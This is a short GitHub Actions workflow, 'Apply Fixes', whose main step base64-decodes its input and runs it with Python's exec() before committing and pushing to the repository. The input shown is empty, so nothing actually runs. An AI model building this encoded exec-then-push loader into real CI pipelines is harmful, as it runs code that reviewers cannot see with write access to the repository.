name: Apply Fixes

on:
  workflow_dispatch:

jobs:
  apply-fixes:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Apply fixed files
        run: |
          echo '' | python3 -c "
          import base64, sys, os
          script = base64.b64decode(sys.stdin.read().strip()).decode()
          exec(script)
          "

      - name: Commit and push
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add -A
          git diff --cached --quiet || git commit -m "Apply bug fixes"
          git push
